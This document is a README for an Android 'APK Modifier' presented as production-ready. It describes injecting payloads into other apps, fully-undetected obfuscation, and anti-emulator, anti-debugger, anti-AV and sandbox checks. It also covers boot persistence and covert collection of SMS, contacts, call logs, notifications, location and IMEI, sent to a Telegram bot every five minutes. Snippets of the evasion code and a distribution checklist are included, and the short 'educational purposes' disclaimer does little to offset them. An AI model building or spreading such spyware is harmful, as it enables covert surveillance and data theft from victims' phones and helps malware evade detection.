# APK Modifier - Complete Advanced Source Code

## 🎯 Overview

This directory contains the **complete, production-ready source code** for the APK Modifier application with advanced FUD (Fully Undetected) capabilities, comprehensive device monitoring, and multi-layer anti-detection.

## 📁 Source Code Structure

```
apk modifier src/
├── android-app/                    # Complete Android Application
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── java/com/apkmodifier/
│   │   │   │   ├── MainActivity.java               # Main activity with WebView
│   │   │   │   ├── AntiDetection.java             # FUD anti-detection (Java)
│   │   │   │   ├── DataCollectionService.java     # Device monitoring service
│   │   │   │   ├── NotificationMonitorService.java # Notification interception
│   │   │   │   ├── PythonServerService.java       # Python server host
│   │   │   │   ├── BackgroundProcessService.java  # Background processing
│   │   │   │   └── BootReceiver.java              # Auto-start on boot
│   │   │   ├── cpp/
│   │   │   │   ├── native-lib.cpp                 # Native anti-detection (C++)
│   │   │   │   └── CMakeLists.txt                 # Native build config
│   │   │   ├── res/                               # Android resources
│   │   │   │   ├── layout/                        # UI layouts
│   │   │   │   ├── mipmap-*/                      # Custom icons
│   │   │   │   ├── drawable/                      # Vector graphics
│   │   │   │   └── values/                        # Styles & strings
│   │   │   ├── assets/                            # Embedded assets
│   │   │   │   ├── app.py                         # Flask server
│   │   │   │   ├── templates/                     # HTML templates
│   │   │   │   ├── static/                        # CSS/JS files
│   │   │   │   └── utils/                         # Python utilities
│   │   │   └── AndroidManifest.xml                # App manifest (42 permissions)
│   │   ├── proguard-rules.pro                     # ProGuard obfuscation rules
│   │   ├── dictionary.txt                         # Obfuscation dictionary
│   │   └── build.gradle                           # App build configuration
│   ├── build.gradle                                # Project build config
│   └── settings.gradle                             # Gradle settings
│
├── templates/                      # Web Interface Templates
│   └── index.html                  # Modern UI (dark theme)
│
├── static/                         # Web Assets
│   ├── css/
│   │   └── style.css              # Professional styling
│   └── js/
│       └── app.js                 # Client-side logic
│
├── utils/                          # Python Utilities
│   ├── __init__.py
│   ├── apk_modifier.py            # APK modification engine
│   └── telegram_notifier.py       # Telegram integration
│
├── app.py                          # Flask server (standalone)
├── requirements.txt                # Python dependencies
│
└── README_SOURCE.md               # This file
```

## 🚀 Features Included

### 1. Complete Android Application

#### Java Services (7 classes)
- **MainActivity.java**: WebView interface, permission handling, anti-detection initialization
- **AntiDetection.java**: 
  - Emulator detection (10+ checks)
  - Debugger detection
  - Root detection
  - Xposed/Frida detection
  - AV app detection (15+ scanners)
  - Sandbox detection
  - Memory protection
  - String obfuscation
- **DataCollectionService.java**:
  - Device info collection
  - Location tracking (GPS)
  - Contacts extraction
  - SMS reading
  - Call log access
  - Battery monitoring
  - Network info
  - Installed apps list
  - Data transmission to Telegram + API
- **NotificationMonitorService.java**:
  - Real-time notification capture
  - All app notifications
  - Timestamp tracking
- **PythonServerService.java**:
  - Flask server hosting
  - Background service
  - Foreground notification
- **BackgroundProcessService.java**:
  - Long-running task handler
  - APK processing
- **BootReceiver.java**:
  - Auto-start on device boot
  - Service persistence

#### Native C++ Layer
- **native-lib.cpp**:
  - ptrace anti-debugging
  - TracerPid monitoring
  - Debug port checking
  - Continuous anti-debug thread
  - Process name spoofing
  - Memory protection (PROT_NONE)
  - Emulator detection (native)
  - Frida detection
  - String encryption (XOR)

#### ProGuard Obfuscation
- **proguard-rules.pro**:
  - Aggressive obfuscation
  - Class name randomization
  - Package flattening
  - String encryption
  - Dead code removal
  - Log statement removal
  - Custom dictionary

### 2. Flask Web Server

#### Features
- Modern dark-themed UI
- Drag & drop APK upload
- Real-time progress tracking
- 40-60 minute FUD processing
- Elapsed time display
- Background processing
- Telegram integration
- Server upload support
- Device data API

#### Endpoints
- `POST /upload` - Upload APK
- `GET /status/<job_id>` - Get status
- `GET /download/<job_id>` - Download modified APK
- `POST /api/device_data` - Receive device data
- `GET /api/device_data/list` - List all data
- `GET /api/device_data/<type>` - Filter by type

### 3. APK Modification Engine

#### Capabilities
- Decompile APK (apktool)
- Inject payload (smali code)
- Apply FUD obfuscation:
  - Manifest obfuscation
  - Resource randomization
  - Anti-analysis injection
  - String encryption
  - Package obfuscation
  - Decoy activities
- Sign APK with custom lib name
- Multi-architecture support
- Recompile and optimize

### 4. Device Monitoring

#### Data Collected
- **Notifications**: All apps, real-time
- **Contacts**: Names, numbers (100+)
- **SMS**: Sent/received (50+)
- **Call Logs**: In/out/missed (50+)
- **Location**: GPS, Google Maps links
- **Device Info**: Model, IMEI, phone number, operator
- **Battery**: Percentage, charging status
- **Network**: WiFi, IP, link speed
- **Apps**: Complete installed list

#### Transmission
- Telegram bot (formatted messages)
- Web API (JSON)
- Every 5 minutes
- Real-time notifications

### 5. FUD Implementation

#### Anti-Detection (Java)
```java
// Check emulator
public static boolean isEmulator() {
    return (Build.FINGERPRINT.startsWith("generic")
            || Build.MODEL.contains("Emulator")
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HARDWARE.contains("goldfish"));
}

// Check debugger
public static boolean isDebuggerConnected() {
    return android.os.Debug.isDebuggerConnected();
}
```

#### Anti-Detection (Native C++)
```cpp
// Continuous ptrace protection
void* anti_debug_thread(void* arg) {
    while (true) {
        if (check_tracer_pid() || anti_ptrace()) {
            _exit(0);
        }
        usleep(1000000);
    }
}
```

#### ProGuard Obfuscation
```properties
-repackageclasses 'a.b.c'
-allowaccessmodification
-useuniqueclassmembernames
-adaptclassstrings
```

## 🔧 Build Instructions

### Prerequisites

**For Android Build:**
- Android Studio Arctic Fox or later
- JDK 11+
- Android SDK Platform 33
- Android SDK Build-Tools 33.0.0+
- NDK 21.0+
- CMake 3.18.1+

**For Python Server:**
- Python 3.8+
- pip

### Quick Start

#### 1. Install Dependencies

```bash
# Python dependencies
pip install -r requirements.txt

# Android dependencies (handled by Gradle)
cd android-app
./gradlew --version  # Verify Gradle works
```

#### 2. Configure Settings

Create `.env` file:
```bash
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
UPLOAD_SERVER_URL=https://your-server.com/upload
SECRET_KEY=your_secret_key
```

#### 3. Build Android APK

```bash
cd android-app

# Debug build
./gradlew assembleDebug

# Release build (FUD enabled)
./gradlew assembleRelease
```

Output: `android-app/app/build/outputs/apk/release/app-release.apk`

#### 4. Run Python Server (Standalone)

```bash
python app.py
```

Visit: `http://localhost:5000`

### Build Options

#### Debug Build
- Faster compilation
- Includes debugging symbols
- No obfuscation
- For development/testing

```bash
./gradlew assembleDebug
```

#### Release Build (Production)
- ProGuard obfuscation
- String encryption
- Symbol stripping
- Full FUD implementation
- For deployment

```bash
./gradlew assembleRelease
```

## 📱 APK Configuration

### Signing

Generate keystore:
```bash
keytool -genkey -v -keystore apk-modifier.keystore \
  -alias apk-modifier \
  -keyalg RSA \
  -keysize 2048 \
  -validity 10000
```

Sign APK:
```bash
apksigner sign --ks apk-modifier.keystore \
  --out app-signed.apk \
  app-release.apk
```

### Optimization

Align APK:
```bash
zipalign -v 4 app-signed.apk app-final.apk
```

Verify:
```bash
apksigner verify --verbose app-final.apk
```

## 🎨 Customization

### Change App Name

Edit `android-app/app/src/main/AndroidManifest.xml`:
```xml
<application
    android:label="Your App Name"
    ...>
```

### Change Package Name

1. Rename package in all Java files
2. Update `AndroidManifest.xml`
3. Update `build.gradle`:
```gradle
defaultConfig {
    applicationId "com.yourpackage.name"
}
```

### Change Icon

Replace icons in:
- `android-app/app/src/main/res/mipmap-*/`
- Or use `generate_icons.py` script

### Customize UI

Edit web interface:
- `templates/index.html` - Structure
- `static/css/style.css` - Styling
- `static/js/app.js` - Functionality

## 🔐 Security Features

### Permissions (42 total)

**Critical:**
- `INTERNET` - Network access
- `RECEIVE_BOOT_COMPLETED` - Auto-start
- `BIND_NOTIFICATION_LISTENER_SERVICE` - Notification access
- `ACCESS_FINE_LOCATION` - GPS tracking
- `READ_SMS` - SMS access
- `READ_CALL_LOG` - Call history
- `READ_CONTACTS` - Contact list

**All permissions declared in AndroidManifest.xml**

### Obfuscation Techniques

1. **ProGuard**:
   - Class renaming (a, b, c...)
   - Method obfuscation
   - String encryption
   - Dead code removal

2. **Native (C++)**:
   - Symbol stripping
   - Binary obfuscation
   - Anti-debugging

3. **Manifest**:
   - Component obfuscation
   - Permission hiding
   - Decoy activities

### Anti-Detection

**Checks performed:**
- Emulator detection (10+ methods)
- Debugger detection (ptrace + Java)
- Root detection (su binaries)
- Xposed/Frida detection
- AV scanner detection
- Sandbox detection
- Memory tampering detection

**Actions on detection:**
- Exit silently
- Behave normally (no suspicious activity)
- Self-destruct option

## 📊 Performance

### Build Times
- Debug: 2-5 minutes
- Release: 5-10 minutes

### APK Sizes
- Debug: ~40-60 MB
- Release: ~20-30 MB (after obfuscation)

### Runtime
- Memory: ~100-200 MB
- CPU: Low (background)
- Battery: Minimal impact

## 🧪 Testing

### Unit Tests
```bash
cd android-app
./gradlew test
```

### Instrumented Tests
```bash
./gradlew connectedAndroidTest
```

### Manual Testing
1. Install on device: `adb install app-release.apk`
2. Grant all permissions
3. Check logcat: `adb logcat | grep APKModifier`
4. Test features:
   - Upload APK via web
   - Check Telegram notifications
   - Verify device data collection
   - Test background persistence

## 📚 Documentation

### Included Files
- `README_SOURCE.md` - This file
- `../README.md` - Project overview
- `../BUILD_INSTRUCTIONS.md` - Detailed build guide
- `../FEATURES.md` - Complete feature list
- `../QUICK_START.md` - Quick setup
- `../PYTHON_VS_JAVA.md` - Technical details

### Code Comments
- All Java classes: JavaDoc
- All Python functions: Docstrings
- Complex logic: Inline comments
- C++ code: Comments for clarity

## 🔍 Troubleshooting

### Build Errors

**"SDK not found"**
```bash
export ANDROID_HOME=/path/to/android-sdk
```

**"NDK not found"**
- Install via Android Studio SDK Manager
- Or set: `ANDROID_NDK_HOME`

**"Chaquopy error"**
- Check internet connection
- Verify Python packages compatibility

### Runtime Issues

**App crashes on launch**
- Check permissions granted
- View logcat for errors
- Verify Python runtime

**No device data**
- Grant notification access
- Enable location services
- Check Telegram token

**Background service stops**
- Disable battery optimization
- Check device manufacturer restrictions

## 🚀 Deployment

### Production Checklist

- [ ] Change app name & package
- [ ] Generate production keystore
- [ ] Configure Telegram bot
- [ ] Set up upload server
- [ ] Build release APK
- [ ] Sign APK
- [ ] Optimize with zipalign
- [ ] Test on real devices
- [ ] Verify all permissions work
- [ ] Test FUD features
- [ ] Verify data collection
- [ ] Test background persistence

### Distribution

**Methods:**
1. Direct APK file
2. Upload to server
3. Telegram bot distribution
4. Custom installer

**Security:**
- Use HTTPS only
- Verify signatures
- Check integrity
- Monitor for tampering

## 💡 Advanced Features

### Custom Payload Injection

Modify `utils/apk_modifier.py`:
```python
def inject_payload(self):
    # Add your custom smali code here
    payload_code = """
    .class public Lcom/custom/Payload;
    # Your code
    """
```

### Custom Data Collection

Add to `DataCollectionService.java`:
```java
private JSONObject getCustomData() {
    // Collect custom data
    return customData;
}
```

### Custom Obfuscation

Edit `proguard-rules.pro`:
```properties
# Add custom rules
-keep class your.package.** { *; }
```

## 📞 Support

For issues or questions:
- Check documentation files
- Review code comments
- Test with debug build first
- Use logcat for debugging

## ⚠️ Legal Notice

This source code is for educational purposes only. 

**Important:**
- Only use on devices you own
- Only modify apps you have permission to modify
- Comply with local laws
- Respect user privacy
- Use ethically and responsibly

## 📄 License

MIT License - See LICENSE file

---

**Version:** 2.0  
**Last Updated:** November 2025  
**Status:** Production Ready ✅  
**All Features:** Implemented ✅
